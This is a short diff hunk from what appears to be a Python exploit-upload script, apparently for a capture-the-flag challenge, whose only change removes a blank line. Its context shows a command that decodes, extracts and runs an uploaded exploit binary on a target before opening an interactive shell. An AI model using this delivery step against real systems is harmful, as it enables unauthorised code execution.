@@ -23,5 +23,4 @@ while True:
 f.close()
 
 p.sendline("base64 -d b64_exp > exp.tar.gz;tar -xzvf exp.tar.gz; chmod +x exp;/exp;")
-
 p.interactive()
